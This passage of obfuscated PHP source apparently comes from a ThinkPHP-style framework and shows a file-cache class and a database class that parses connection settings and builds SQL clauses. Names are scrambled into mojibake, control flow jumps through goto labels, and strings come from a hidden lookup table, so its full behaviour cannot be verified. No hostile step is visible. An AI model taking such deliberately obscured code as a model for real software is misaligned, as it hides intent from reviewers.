LOCK_EX)) { return !0; } @unlink($e‡´¬ùËÄ); return !1; } public function get($CÅä¬Ûá) { $bÜÁÓç¢Û‘ = $this->getFile($CÅä¬Ûá); if (file_exists($bÜÁÓç¢Û‘) && filemtime($bÜÁÓç¢Û‘) < time() - $this->cacheTime) { @unlink($bÜÁÓç¢Û‘); return !1; } $c¤¸Ù×ÑÄÓ = @file_get_contents($bÜÁÓç¢Û‘); return substr($c¤¸Ù×ÑÄÓ, strlen($this->prefix)); } public function remove($EáÙ½À¶“) { $eùÁŠ¼Šœ = $this->getFile($EáÙ½À¶“); return @unlink($eùÁŠ¼Šœ); } public function deleteAll() { $d’ÃÃÊ¤® =& $_SERVER[¼]; $DùŠùØŒ‰ = scandir($this->cachePath); foreach ($DùŠùØŒ‰ as $Aƒ ¤©Œãˆ) { $aİ¤Š­àÏ¦ = $this->cachePath . $Aƒ ¤©Œãˆ; if (strpos($aİ¤Š­àÏ¦, $d’ÃÃÊ¤®[764]) && strpos($aİ¤Š­àÏ¦, $d’ÃÃÊ¤®[765])) { @unlink($aİ¤Š­àÏ¦); } } } public function clearTimeout() { $c†˜™áÏÛŞ =& $_SERVER[¼]; $cÏÓÑÌÆ‘’ = scandir($this->cachePath); foreach ($cÏÓÑÌÆ‘’ as $F·Š˜àÄ¸Ø) { $F„©‡©²‘ = $this->cachePath . $F·Š˜àÄ¸Ø; if (strpos($F„©‡©²‘, $c†˜™áÏÛŞ[764]) && strpos($F„©‡©²‘, $c†˜™áÏÛŞ[765]) && filemtime($F„©‡©²‘) < time() - $this->cacheTime) { @unlink($F„©‡©²‘); } } } } goto c¤ÅóÛô¤Î; d¾÷‡§£ßç: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\75", "\156\x65\x71" => "\74\76", "\147\x74" => "\76", "\x65\147\164" => "\76\75", "\154\x74" => "\74", "\x65\x6c\x74" => "\74\75", "\156\157\164\154\151\x6b\145" => "\x4e\117\x54\x20\x4c\111\x4b\x45", "\x6c\151\x6b\145" => "\x4c\x49\x4b\105", "\x69\x6e" => "\111\116", "\156\157\164\151\156" => "\x4e\117\124\x20\111\x4e", "\x6e\x6f\x74\40\151\156" => "\116\117\124\40\x49\x4e", "\x62\145\x74\x77\x65\145\x6e" => "\102\105\124\x57\x45\105\116", "\x6e\x6f\x74\142\x65\x74\167\145\x65\156" => "\116\x4f\x54\x20\x42\105\x54\127\x45\105\x4e", "\156\x6f\164\40\x62\145\x74\x77\x65\145\156" => "\116\x4f\124\40\x42\105\124\127\x45\105\x4e"); protected $selectSql = "\x53\x45\x4c\105\x43\124\x25\x44\x49\x53\124\x49\116\103\x54\45\40\x25\x46\x49\105\x4c\x44\45\40\x46\122\117\x4d\40\45\x54\101\102\x4c\105\45\45\112\117\x49\116\x25\x25\127\110\x45\122\x45\45\45\x47\x52\x4f\x55\x50\x25\45\110\x41\x56\111\x4e\107\x25\45\117\122\x44\x45\122\45\45\114\111\115\x49\124\45\40\x25\125\x4e\111\x4f\x4e\45\x25\103\x4f\x4d\x4d\x45\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $DÚ§©‹ñí = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¼][870], $DÚ§©‹ñí); } public function factory($AÎØŒå•Š± = '') { goto F¸¾˜ù …Î; b¨Œ¡ò§Îø: $this->dbType = ucwords(strtolower($AÎØŒå•Š±[$aóñÀñÍ½[871]])); $A†’šµ¹ = $aóñÀñÍ½[873] . $this->dbType; if (class_exists($A†’šµ¹)) { $C¸ŠÂö¥Ñ = new $A†’šµ¹($AÎØŒå•Š±); if ($aóñÀñÍ½[716] != strtolower($AÎØŒå•Š±[$aóñÀñÍ½[871]])) { $C¸ŠÂö¥Ñ->dbType = strtoupper($this->dbType); } else { $C¸ŠÂö¥Ñ->dbType = $this->_getDsnType($AÎØŒå•Š±[$aóñÀñÍ½[823]]); } } else { think_exception(think_lang($aóñÀñÍ½[874]) . $aóñÀñÍ½[875] . $A†’šµ¹); } goto dœª³ØÈ¡; F¸¾˜ù …Î: $aóñÀñÍ½ =& $_SERVER[¼]; $AÎØŒå•Š± = $this->parseConfig($AÎØŒå•Š±); if (empty($AÎØŒå•Š±[$aóñÀñÍ½[871]])) { think_exception(think_lang($aóñÀñÍ½[872])); } goto b¨Œ¡ò§Îø; dœª³ØÈ¡: return $C¸ŠÂö¥Ñ; goto fÕªÄŞ‰Åˆ; fÕªÄŞ‰Åˆ: } public function __call($c¤¹å”ïÉÖ, $C°—¨ß·îç) { if (method_exists($this, $c¤¹å”ïÉÖ)) { return call_user_func_array(array($this, $c¤¹å”ïÉÖ), $C°—¨ß·îç); } } protected function _getDsnType($f‹‹Üë‚ªÀ) { $EæˆáÎ×‘ = explode($_SERVER[¼][4], $f‹‹Üë‚ªÀ); $e‘éåöÔàá = strtoupper(trim($EæˆáÎ×‘[0])); return $e‘éåöÔàá; } private function parseConfig($E×‚ê›µÅå = '') { $d÷òÛµ¨Œ­ =& $_SERVER[¼]; if (!empty($E×‚ê›µÅå) && is_string($E×‚ê›µÅå)) { $E×‚ê›µÅå = $this->parseDSN($E×‚ê›µÅå); } elseif (is_array($E×‚ê›µÅå)) { $E×‚ê›µÅå = array_change_key_case($E×‚ê›µÅå); $E×‚ê›µÅå = array($d÷òÛµ¨Œ­[871] => $E×‚ê›µÅå[$d÷òÛµ¨Œ­[715]], $d÷òÛµ¨Œ­[796] => $E×‚ê›µÅå[$d÷òÛµ¨Œ­[876]], $d÷òÛµ¨Œ­[797] => $E×‚ê›µÅå[$d÷òÛµ¨Œ­[877]], $d÷òÛµ¨Œ­[794] => $E×‚ê›µÅå[$d÷òÛµ¨Œ­[878]], $d÷òÛµ¨Œ­[795] => $E×‚ê›µÅå[$d÷òÛµ¨Œ­[879]], $d÷òÛµ¨Œ­[17] => $E×‚ê›µÅå[$d÷òÛµ¨Œ­[880]], $d÷òÛµ¨Œ­[823] => $E×‚ê›µÅå[$d÷òÛµ¨Œ­[717]], $d÷òÛµ¨Œ­[13] => isset($E×‚ê›µÅå[$d÷òÛµ¨Œ­[881]]) ? $E×‚ê›µÅå[$d÷òÛµ¨Œ­[881]] : array()); } elseif (empty($E×‚ê›µÅå)) { if (think_config($d÷òÛµ¨Œ­[882]) && $d÷òÛµ¨Œ­[716] != strtolower(think_config($d÷òÛµ¨Œ­[883]))) { $E×‚ê›µÅå = $this->parseDSN(think_config($d÷òÛµ¨Œ­[882])); } else { $E×‚ê›µÅå = array($d÷òÛµ¨Œ­[871] => think_config($d÷òÛµ¨Œ­[883]), $d÷òÛµ¨Œ­[796] => think_config($d÷òÛµ¨Œ­[884]), $d÷òÛµ¨Œ­[797] => think_config($d÷òÛµ¨Œ­[885]), $d÷òÛµ¨Œ­[794] => think_config($d÷òÛµ¨Œ­[886]), $d÷òÛµ¨Œ­[795] => think_config($d÷òÛµ¨Œ­[887]), $d÷òÛµ¨Œ­[17] => think_config($d÷òÛµ¨Œ­[231]), $d÷òÛµ¨Œ­[823] => think_config($d÷òÛµ¨Œ­[882]), $d÷òÛµ¨Œ­[13] => think_config($d÷òÛµ¨Œ­[888])); } } return $E×‚ê›µÅå; } protected function initConnect($d»ğÄöÃªé = true) { if (1 == think_config($_SERVER[¼][18])) { $this->_linkID = $this->multiConnect($d»ğÄöÃªé); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($D‘Úö¶¶Çè = false) { $Eó‚«á—¯Ñ =& $_SERVER[¼]; static $c¦çÀ¬°¨ = array(); if (empty($c¦çÀ¬°¨)) { foreach ($this->config as $EÛÓ‹ØßÚ— => $c­Ê¼‚èã) { $c¦çÀ¬°¨[$EÛÓ‹ØßÚ—] = explode($Eó‚«á—¯Ñ[47], $c­Ê¼‚èã); } } if (think_config($Eó‚«á—¯Ñ[889])) { if ($D‘Úö¶¶Çè) { $dÅáÈ¥»È = floor(mt_rand(0, think_config($Eó‚«á—¯Ñ[890]) - 1)); } else { if (is_numeric(think_config($Eó‚«á—¯Ñ[891]))) { $dÅáÈ¥»È = think_config($Eó‚«á—¯Ñ[891]); } else { $dÅáÈ¥»È = floor(mt_rand(think_config($Eó‚«á—¯Ñ[890]), count($c¦çÀ¬°¨[$Eó‚«á—¯Ñ[794]]) - 1)); } } } else { $dÅáÈ¥»È = floor(mt_rand(0, count($c¦çÀ¬°¨[$Eó‚«á—¯Ñ[794]]) - 1)); } $dæ£ëÒ¦ = array($Eó‚«á—¯Ñ[796] => isset($c¦çÀ¬°¨[$Eó‚«á—¯Ñ[796]][$dÅáÈ¥»È]) ? $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[796]][$dÅáÈ¥»È] : $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[796]][0], $Eó‚«á—¯Ñ[797] => isset($c¦çÀ¬°¨[$Eó‚«á—¯Ñ[797]][$dÅáÈ¥»È]) ? $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[797]][$dÅáÈ¥»È] : $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[797]][0], $Eó‚«á—¯Ñ[794] => isset($c¦çÀ¬°¨[$Eó‚«á—¯Ñ[794]][$dÅáÈ¥»È]) ? $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[794]][$dÅáÈ¥»È] : $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[794]][0], $Eó‚«á—¯Ñ[795] => isset($c¦çÀ¬°¨[$Eó‚«á—¯Ñ[795]][$dÅáÈ¥»È]) ? $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[795]][$dÅáÈ¥»È] : $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[795]][0], $Eó‚«á—¯Ñ[17] => isset($c¦çÀ¬°¨[$Eó‚«á—¯Ñ[17]][$dÅáÈ¥»È]) ? $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[17]][$dÅáÈ¥»È] : $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[17]][0], $Eó‚«á—¯Ñ[823] => isset($c¦çÀ¬°¨[$Eó‚«á—¯Ñ[823]][$dÅáÈ¥»È]) ? $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[823]][$dÅáÈ¥»È] : $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[823]][0], $Eó‚«á—¯Ñ[13] => isset($c¦çÀ¬°¨[$Eó‚«á—¯Ñ[13]][$dÅáÈ¥»È]) ? $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[13]][$dÅáÈ¥»È] : $c¦çÀ¬°¨[$Eó‚«á—¯Ñ[13]][0]); return $this->connect($dæ£ëÒ¦, $dÅáÈ¥»È); } public function parseDSN($EöƒÂ‚ÖÖä) { $fŞÍà°Õ²Â =& $_SERVER[¼]; if (empty($EöƒÂ‚ÖÖä)) { return !1; } $c‘«íØ¥æÂ = parse_url($EöƒÂ‚ÖÖä); if ($c‘«íØ¥æÂ[$fŞÍà°Õ²Â[165]]) { $D«À×Ó½¡Ë = array($fŞÍà°Õ²Â[871] => $c‘«íØ¥æÂ[$fŞÍà°Õ²Â[165]], $fŞÍà°Õ²Â[796] => isset($c‘«íØ¥æÂ[$fŞÍà°Õ²Â[531]]) ? $c‘«íØ¥æÂ[$fŞÍà°Õ²Â[531]] : $fŞÍà°Õ²Â[33], $fŞÍà°Õ²Â[797] => isset($c‘«íØ¥æÂ[$fŞÍà°Õ²Â[892]]) ? $c‘«íØ¥æÂ[$fŞÍà°Õ²Â[892]] : $fŞÍà°Õ²Â[33], $fŞÍà°Õ²Â[794] => isset($c‘«íØ¥æÂ[$fŞÍà°Õ²Â[166]]) ? $c‘«íØ¥æÂ[$fŞÍà°Õ²Â[166]] : $fŞÍà°Õ²Â[33], $fŞÍà°Õ²Â[795] => isset($c‘«íØ¥æÂ[$fŞÍà°Õ²Â[167]]) ? $c‘«íØ¥æÂ[$fŞÍà°Õ²Â[167]] : $fŞÍà°Õ²Â[33], $fŞÍà°Õ²Â[17] => isset($c‘«íØ¥æÂ[$fŞÍà°Õ²Â[75]]) ? substr($c‘«íØ¥æÂ[$fŞÍà°Õ²Â[75]], 1) : $fŞÍà°Õ²Â[33]); } else { preg_match($fŞÍà°Õ²Â[893], trim($EöƒÂ‚ÖÖä), $Aˆ©ğĞÄ¸²); $D«À×Ó½¡Ë = array($fŞÍà°Õ²Â[871] => $Aˆ©ğĞÄ¸²[1], $fŞÍà°Õ²Â[796] => $Aˆ©ğĞÄ¸²[2], $fŞÍà°Õ²Â[797] => $Aˆ©ğĞÄ¸²[3], $fŞÍà°Õ²Â[794] => $Aˆ©ğĞÄ¸²[4], $fŞÍà°Õ²Â[795] => $Aˆ©ğĞÄ¸²[5], $fŞÍà°Õ²Â[17] => $Aˆ©ğĞÄ¸²[6]); } $D«À×Ó½¡Ë[$fŞÍà°Õ²Â[823]] = $fŞÍà°Õ²Â[33]; return $D«À×Ó½¡Ë; } protected function debug() { $E¥ğ†ÚÓŒ =& $_SERVER[¼]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $E¥ğ†ÚÓŒ[894]; if (think_config($E¥ğ†ÚÓŒ[895])) { think_status($E¥ğ†ÚÓŒ[896]); think_trace($this->queryStr . $E¥ğ†ÚÓŒ[897] . think_status($E¥ğ†ÚÓŒ[20], $E¥ğ†ÚÓŒ[896], 6) . $E¥ğ†ÚÓŒ[898], $E¥ğ†ÚÓŒ[33], $E¥ğ†ÚÓŒ[899]); } } protected function parseLock($FÉÀî°¢ĞŸ = false) { $EéàŞ„àãº =& $_SERVER[¼]; if (!$FÉÀî°¢ĞŸ) { return $EéàŞ„àãº[33]; } if ($EéàŞ„àãº[825] == $this->dbType) { return $EéàŞ„àãº[900]; } return $EéàŞ„àãº[901]; } protected function parseSet($cª”øÌ›’) { $a¡í§ƒëÁ£ =& $_SERVER[¼]; foreach ($cª”øÌ›’ as $bËùºäÂµ => $a…Ì²ğôòŠ) { if (is_array($a…Ì²ğôòŠ) && $a¡í§ƒëÁ£[282] == $a…Ì²ğôòŠ[0]) { $dƒÊïìÑ[] = $this->parseKey($bËùºäÂµ) . $a¡í§ƒëÁ£[902] . $a…Ì²ğôòŠ[1]; } elseif (is_scalar($a…Ì²ğôòŠ) || is_null($a…Ì²ğôòŠ)) { $dƒÊïìÑ[] = $this->parseKey($bËùºäÂµ) . $a¡í§ƒëÁ£[902] . $this->parseValue($a…Ì²ğôòŠ); } } return $a¡í§ƒëÁ£[903] . implode($a¡í§ƒëÁ£[47], $dƒÊïìÑ); } protected function bindParam($E…ÕÉŞë£, $c‚‡×óí‚ô) { $this->bind[$_SERVER[¼][4] . $E…ÕÉŞë£] = $c‚‡×óí‚ô; } protected function parseBind($a…Ñ–©«àï) { $a…Ñ–©«àï = array_merge($this->bind, $a…Ñ–©«àï); $this->bind = array(); return $a…Ñ–©«àï; } function parseKey(&$F²ÉÊˆ¤±, $f†í˜·’ò = true) { if ($f†í˜·’ò) { $F²ÉÊˆ¤± = $this->parseKeyCheck($F²ÉÊˆ¤±); } return $F²ÉÊˆ¤±; } function parseKeyCheck($cŒãâØ³„ì) { $a†ÊÒ÷ö÷ =& $_SERVER[¼]; $cŒãâØ³„ì = trim($cŒãâØ³„ì); if (!preg_match($a†ÊÒ÷ö÷[904], $cŒãâØ³„ì)) { think_exception($a†ÊÒ÷ö÷[905] . $cŒãâØ³„ì); } return $cŒãâØ³„ì; } protected function parseValue($EŠÅ÷Õ›âï) { $BÆô‹µ‚ÖÅ =& $_SERVER[¼]; if (is_string($EŠÅ÷Õ›âï)) { $EŠÅ÷Õ›âï = $BÆô‹µ‚ÖÅ[864] . $this->escapeString($EŠÅ÷Õ›âï) . $BÆô‹µ‚ÖÅ[864]; } elseif (isset($EŠÅ÷Õ›âï[0]) && is_string($EŠÅ÷Õ›âï[0]) && strtolower($EŠÅ÷Õ›âï[0]) == $BÆô‹µ‚ÖÅ[282]) { $EŠÅ÷Õ›âï = $this->escapeString($EŠÅ÷Õ›âï[1]); } elseif (is_array($EŠÅ÷Õ›âï)) { $EŠÅ÷Õ›âï = array_map(array($this, $BÆô‹µ‚ÖÅ[865]), $EŠÅ÷Õ›âï); } elseif (is_bool($EŠÅ÷Õ›âï)) { $EŠÅ÷Õ›âï = $EŠÅ÷Õ›âï ? $BÆô‹µ‚ÖÅ[83] : $BÆô‹µ‚ÖÅ[464]; } elseif (is_null($EŠÅ÷Õ›âï)) { $EŠÅ÷Õ›âï = $BÆô‹µ‚ÖÅ[101]; } return $EŠÅ÷Õ›âï; } protected function parseField($f¦»‡ÂŸŸ) { $A×Ú±«İÆ =& $_SERVER[¼]; if (is_string($f¦»‡ÂŸŸ) && strpos($f¦»‡ÂŸŸ, $A×Ú±«İÆ[47])) { $f¦»‡ÂŸŸ = explode($A×Ú±«İÆ[47], $f¦»‡ÂŸŸ); } if (is_array($f¦»‡ÂŸŸ)) { $CŠ»°…†Ê = array(); foreach ($f¦»‡ÂŸŸ as $B²ÚÎİÛÏ“ => $E‚ì¢©ñ) { if (!is_numeric($B²ÚÎİÛÏ“)) { $CŠ»°…†Ê[] = $this->parseKey($B²ÚÎİÛÏ“) . $A×Ú±«İÆ[906] . $this->parseKey($E‚ì¢©ñ); } else { $CŠ»°…†Ê[] = $this->parseKey($E‚ì¢©ñ); } } $d¤êÍ¨ñµÔ = implode($A×Ú±«İÆ[47], $CŠ»°…†Ê); } elseif (is_string($f¦»‡ÂŸŸ) && !empty($f¦»‡ÂŸŸ)) { $d¤êÍ¨ñµÔ = $f¦»‡ÂŸŸ; } else { $d¤êÍ¨ñµÔ = $A×Ú±«İÆ[173]; } return $d¤êÍ¨ñµÔ; } protected function parseTable($DÔ˜ÚÇ¶âŸ) { $aØ™†‹Ü¿Ù =& $_SERVER[¼]; if (is_array($DÔ˜ÚÇ¶âŸ)) { $dœÆÈÈËº™ = array(); foreach ($DÔ˜ÚÇ¶âŸ as $AÕ‹ßÊ¤å¨ => $c…¢°ÈñÇ) { if (!is_numeric($AÕ‹ßÊ¤å¨)) { $dœÆÈÈËº™[] = $this->parseKey($AÕ‹ßÊ¤å¨) . $aØ™†‹Ü¿Ù[50] . $this->parseKey($c…¢°ÈñÇ); } else { $dœÆÈÈËº™[] = $this->parseKey($AÕ‹ßÊ¤å¨); } } $DÔ˜ÚÇ¶âŸ = $dœÆÈÈËº™; } elseif (is_string($DÔ˜ÚÇ¶âŸ)) { if (strstr($DÔ˜ÚÇ¶âŸ, $aØ™†‹Ü¿Ù[50])) { return $DÔ˜ÚÇ¶âŸ; } $DÔ˜ÚÇ¶âŸ = explode($aØ™†‹Ü¿Ù[47], $DÔ˜ÚÇ¶âŸ); array_walk($DÔ˜ÚÇ¶âŸ, array($this, $aØ™†‹Ü¿Ù[813])); } return $aØ™†‹Ü¿Ù[907] . trim(implode($aØ™†‹Ü¿Ù[908], $DÔ˜ÚÇ¶âŸ), $aØ™†‹Ü¿Ù[819]) . $aØ™†‹Ü¿Ù[907]; } protected function parseWhere($b§µ´£ÆÔ) { $A†Ãß‘âÚ¢ =& $_SERVER[¼]; $F±Ûª…Áİë = $A†Ãß‘âÚ¢[33]; if (is_string($b§µ´£ÆÔ)) { $F±Ûª…Áİë = $b§µ´£ÆÔ; } else { $fš¢²œ¡ß¨ = isset($b§µ´£ÆÔ[$A†Ãß‘âÚ¢[909]]) ? strtoupper($b§µ´£ÆÔ[$A†Ãß‘âÚ¢[909]]) : $A†Ãß‘âÚ¢[33]; if (in_array($fš¢²œ¡ß¨, array($A†Ãß‘âÚ¢[910], $A†Ãß‘âÚ¢[911], $A†Ãß‘âÚ¢[912]))) { $fš¢²œ¡ß¨ = $A†Ãß‘âÚ¢[50] . $fš¢²œ¡ß¨ . $A†Ãß‘âÚ¢[50]; unset($b§µ´£ÆÔ[$A†Ãß‘âÚ¢[909]]); } else { $fš¢²œ¡ß¨ = $A†Ãß‘âÚ¢[913]; } foreach ($b§µ´£ÆÔ as $BÌä³Œô» => $eíÏÂ­İ”) { $F±Ûª…Áİë .= $A†Ãß‘âÚ¢[262]; if (is_numeric($BÌä³Œô»)) { $BÌä³Œô» = $A†Ãß‘âÚ¢[914]; } if (0 === strpos($BÌä³Œô», $A†Ãß‘âÚ¢[70])) { $F±Ûª…Áİë .= $this->parseThinkWhere($BÌä³Œô», $eíÏÂ­İ”); } else { if (!preg_match($A†Ãß‘âÚ¢[915], trim($BÌä³Œô»))) { think_exception(think_lang($A†Ãß‘âÚ¢[916]) . $A†Ãß‘âÚ¢[4] . $BÌä³Œô»); } $eæ¥³®Å‹Ÿ = is_array($eíÏÂ­İ”) && isset($eíÏÂ­İ”[$A†Ãß‘âÚ¢[917]]); $BÌä³Œô» = trim($BÌä³Œô»); if (strpos($BÌä³Œô», $A†Ãß‘âÚ¢[268])) { $bõ……–»· = explode($A†Ãß‘âÚ¢[268], $BÌä³Œô»); $eŒô™˜×»Ô = array(); foreach ($bõ……–»· as $b‡•ÉĞƒá => $eŸ‰ºÔåÇµ) { $FÂò…Ï»ñí = $eæ¥³®Å‹Ÿ ? $eíÏÂ­İ”[$b‡•ÉĞƒá] : $eíÏÂ­İ”; $eŒô™˜×»Ô[] = $A†Ãß‘âÚ¢[245] . $this->parseWhereItem($this->parseKey($eŸ‰ºÔåÇµ), $FÂò…Ï»ñí) . $A†Ãß‘âÚ¢[812]; } $F±Ûª…Áİë .= implode($A†Ãß‘âÚ¢[918], $eŒô™˜×»Ô); } elseif (strpos($BÌä³Œô», $A†Ãß‘âÚ¢[269])) { $bõ……–»· = explode($A†Ãß‘âÚ¢[269], $BÌä³Œô»); $eŒô™˜×»Ô = array(); foreach ($bõ……–»· as $b‡•ÉĞƒá => $eŸ‰ºÔåÇµ) { $FÂò…Ï»ñí = $eæ¥³®Å‹Ÿ ? $eíÏÂ­İ”[$b‡•ÉĞƒá] : $eíÏÂ­İ”; $eŒô™˜×»Ô[] = $A†Ãß‘âÚ¢[245] . $this->parseWhereItem($this->parseKey($eŸ‰ºÔåÇµ), $FÂò…Ï»ñí) . $A†Ãß‘âÚ¢[812]; } $F±Ûª…Áİë .= implode($A†Ãß‘âÚ¢[913], $eŒô™˜×»Ô); } else { $F±Ûª…Áİë .= $this->parseWhereItem($this->parseKey($BÌä³Œô»), $eíÏÂ­İ”); } } $F±Ûª…Áİë .= $A†Ãß‘âÚ¢[263] . $fš¢²œ¡ß¨; } $F±Ûª…Áİë = substr($F±Ûª…Áİë, 0, -strlen($fš¢²œ¡ß¨)); } return empty($F±Ûª…Áİë) ? $A†Ãß‘âÚ¢[33] : $A†Ãß‘âÚ¢[919] . $F±Ûª…Áİë; } protected function parseWhereItem($bÁğ¬âá«Ò, $D–ÑšºøÜ) { $a»”‚¥ç–í =& $_SERVER[¼]; $bë‹ïâ®ğ¸ = $a»”‚¥ç–í[33]; if (is_array($D–ÑšºøÜ)) { if (is_string($D–ÑšºøÜ[0])) { $d‹ÚÍŒÁ…‘ = strtolower($D–ÑšºøÜ[0]); if (in_array($D–ÑšºøÜ[0], array($a»”‚¥ç–í[902], $a»”‚¥ç–í[920], $a»”‚¥ç–í[921], $a»”‚¥ç–í[922], $a»”‚¥ç–í[923], $a»”‚¥ç–í[924]))) { $bë‹ïâ®ğ¸ .= $bÁğ¬âá«Ò . $a»”‚¥ç–í[50] . $D–ÑšºøÜ[0] . $a»”‚¥ç–í[50] . $this->parseValue($D–ÑšºøÜ[1]); } elseif (preg_match($a»”‚¥ç–í[925], $D–ÑšºøÜ[0])) { $bë‹ïâ®ğ¸ .= $bÁğ¬âá«Ò . $a»”‚¥ç–í[50] . $this->exp[$d‹ÚÍŒÁ…‘] . $a»”‚¥ç–í[50] . $this->parseValue($D–ÑšºøÜ[1]); } elseif (preg_match($a»”‚¥ç–í[926], $D–ÑšºøÜ[0])) { if (is_array($D–ÑšºøÜ[1])) { $C°Šß‡­ = isset($D–ÑšºøÜ[2]) ? strtoupper($D–ÑšºøÜ[2]) : $a»”‚¥ç–í[911]; if (in_array($C°Šß‡­, array($a»”‚¥ç–í[910], $a»”‚¥ç–í[911], $a»”‚¥ç–í[912]))) { $EÙ‘É»Ú×  = array(); foreach ($D–ÑšºøÜ[1] as $a‰…Å”®ª) { $EÙ‘É»Ú× [] = $bÁğ¬âá«Ò . $a»”‚¥ç–í[50] . $this->exp[$d‹ÚÍŒÁ…‘] . $a»”‚¥ç–í[50] . $this->parseValue($a‰…Å”®ª); } $bë‹ïâ®ğ¸ .= $a»”‚¥ç–í[245] . implode($a»”‚¥ç–í[50] . $C°Šß‡­ . $a»”‚¥ç–í[50], $EÙ‘É»Ú× ) . $a»”‚¥ç–í[812]; } } else { $bë‹ïâ®ğ¸ .= $bÁğ¬âá«Ò . $a»”‚¥ç–í[50] . $this->exp[$d‹ÚÍŒÁ…‘] . $a»”‚¥ç–í[50] . $this->parseValue($D–ÑšºøÜ[1]); } } elseif ($a»”‚¥ç–í[282] == $d‹ÚÍŒÁ…‘) { $bë‹ïâ®ğ¸ .= $a»”‚¥ç–í[810] . $bÁğ¬âá«Ò . $a»”‚¥ç–í[50] . $D–ÑšºøÜ[1] . $a»”‚¥ç–í[927]; } elseif (preg_match($a»”‚¥ç–í[928], $D–ÑšºøÜ[0])) { if (isset($D–ÑšºøÜ[2]) && $a»”‚¥ç–í[282] == $D–ÑšºøÜ[2]) { $bë‹ïâ®ğ¸ .= $bÁğ¬âá«Ò . $a»”‚¥ç–í[50] . $this->exp[$d‹ÚÍŒÁ…‘] . $a»”‚¥ç–í[50] . $D–ÑšºøÜ[1]; } else { if (is_string($D–ÑšºøÜ[1])) { $D–ÑšºøÜ[1] = explode($a»”‚¥ç–í[47], $D–ÑšºøÜ[1]); } $aÚšª‚µÌ = implode($a»”‚¥ç–í[47], $this->parseValue($D–ÑšºøÜ[1])); $bë‹ïâ®ğ¸ .= $bÁğ¬âá«Ò . $a»”‚¥ç–í[50] . $this->exp[$d‹ÚÍŒÁ…‘] . $a»”‚¥ç–í[810] . $aÚšª‚µÌ . $a»”‚¥ç–í[812]; } } elseif (preg_match($a»”‚¥ç–í[929], $D–ÑšºøÜ[0])) { $B±¿¶ñ´„ù = is_string($D–ÑšºøÜ[1]) ? explode($a»”‚¥ç–í[47], $D–ÑšºøÜ[1]) : $D–ÑšºøÜ[1]; $bë‹ïâ®ğ¸ .= $a»”‚¥ç–í[810] . $bÁğ¬âá«Ò . $a»”‚¥ç–í[50] . $this->exp[$d‹ÚÍŒÁ…‘] . $a»”‚¥ç–í[50] . $this->parseValue($B±¿¶ñ´„ù[0]) . $a»”‚¥ç–í[913] . $this->parseValue($B±¿¶ñ´„ù[1]) . $a»”‚¥ç–í[263]; } else { think_exception(think_lang($a»”‚¥ç–í[916]) . $a»”‚¥ç–í[4] . $D–ÑšºøÜ[0]); } } else { $Cê©ÑÃïòŸ = count($D–ÑšºøÜ); $C¬ï©ô®÷É = isset($D–ÑšºøÜ[$Cê©ÑÃïòŸ - 1]) ? strtoupper($D–ÑšºøÜ[$Cê©ÑÃïòŸ - 1]) : $a»”‚¥ç–í[33]; if (in_array($C¬ï©ô®÷É, array($a»”‚¥ç–í[910], $a»”‚¥ç–í[911], $a»”‚¥ç–í[912]))) { $Cê©ÑÃïòŸ = $Cê©ÑÃïòŸ - 1; } else { $C¬ï©ô®÷É = $a»”‚¥ç–í[910]; } for ($d¶ÔÄ…â = 0; $d¶ÔÄ…â < $Cê©ÑÃïòŸ; $d¶ÔÄ…â++) { $B±¿¶ñ´„ù = is_array($D–ÑšºøÜ[$d¶ÔÄ…â]) ? $D–ÑšºøÜ[$d¶ÔÄ…â][1] : $D–ÑšºøÜ[$d¶ÔÄ…â]; if ($a»”‚¥ç–í[282] == strtolower($D–ÑšºøÜ[$d¶ÔÄ…â][0])) { $bë‹ïâ®ğ¸ .= $a»”‚¥ç–í[245] . $bÁğ¬âá«Ò . $a»”‚¥ç–í[50] . $B±¿¶ñ´„ù . $a»”‚¥ç–í[927] . $C¬ï©ô®÷É . $a»”‚¥ç–í[50]; } else { $Eù¢…Ä“‘¡ = is_array($D–ÑšºøÜ[$d¶ÔÄ…â]) ? $this->exp[strtolower($D–ÑšºøÜ[$d¶ÔÄ…â][0])] : $a»”‚¥ç–í[902]; if (!$Eù¢…Ä“‘¡ && is_array($D–ÑšºøÜ[$d¶ÔÄ…â]) && in_array($D–ÑšºøÜ[$d¶ÔÄ…â][0], array($a»”‚¥ç–í[902], $a»”‚¥ç–í[920], $a»”‚¥ç–í[921], $a»”‚¥ç–í[922], $a»”‚¥ç–í[923], $a»”‚¥ç–í[924]))) { $Eù¢…Ä“‘¡ = $D–ÑšºøÜ[$d¶ÔÄ…â][0]; } $bë‹ïâ®ğ¸ .= $a»”‚¥ç–í[245] . $bÁğ¬âá«Ò . $a»”‚¥ç–í[50] . $Eù¢…Ä“‘¡ . $a»”‚¥ç–í[50] . $this->parseValue($B±¿¶ñ´„ù) . $a»”‚¥ç–í[927] . $C¬ï©ô®÷É . $a»”‚¥ç–í[50]; } } $bë‹ïâ®ğ¸ = substr($bë‹ïâ®ğ¸, 0, -4); } } else { $bë‹ïâ®ğ¸ .= $bÁğ¬âá«Ò . $a»”‚¥ç–í[930] . $this->parseValue($D–ÑšºøÜ); } return $bë‹ïâ®ğ¸; } protected function parseThinkWhere($cÈôë†ïó, $DÍÍòô´÷Ä) { $B¤Çˆ££ª =& $_SERVER[¼]; $bòÍÌŸÎö‘ = $B¤Çˆ££ª[33]; switch 